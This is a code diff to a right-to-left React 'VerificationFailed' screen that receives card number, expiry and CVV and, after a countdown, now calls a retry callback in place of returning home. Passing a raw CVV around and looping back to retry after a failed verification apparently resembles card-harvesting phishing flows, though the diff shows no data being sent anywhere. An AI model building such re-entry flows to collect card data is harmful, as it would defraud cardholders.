@@ -1,26 +1,27 @@
 import { useEffect, useState } from 'react';
 import { X } from 'lucide-react';
-import { useNavigate } from 'react-router-dom';
 
 interface VerificationFailedProps {
   cardNumber: string;
   cardExpiry: string;
   cardCvv: string;
   countdownSeconds?: number;
+  onRetry?: () => void;
 }
 
 const VerificationFailed = ({ 
   cardNumber, 
   cardExpiry, 
   cardCvv, 
-  countdownSeconds = 5 
+  countdownSeconds = 5,
+  onRetry
 }: VerificationFailedProps) => {
-  const navigate = useNavigate();
   const [countdown, setCountdown] = useState(countdownSeconds);
 
   useEffect(() => {
     if (countdown <= 0) {
-      navigate('/');
+      // إعادة المحاولة بدلاً من الذهاب للرئيسية
+      onRetry?.();
       return;
     }
 
@@ -29,7 +30,7 @@ const VerificationFailed = ({
     }, 1000);
 
     return () => clearInterval(timer);
-  }, [countdown, navigate]);
+  }, [countdown, onRetry]);
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center w-full px-5" dir="rtl">
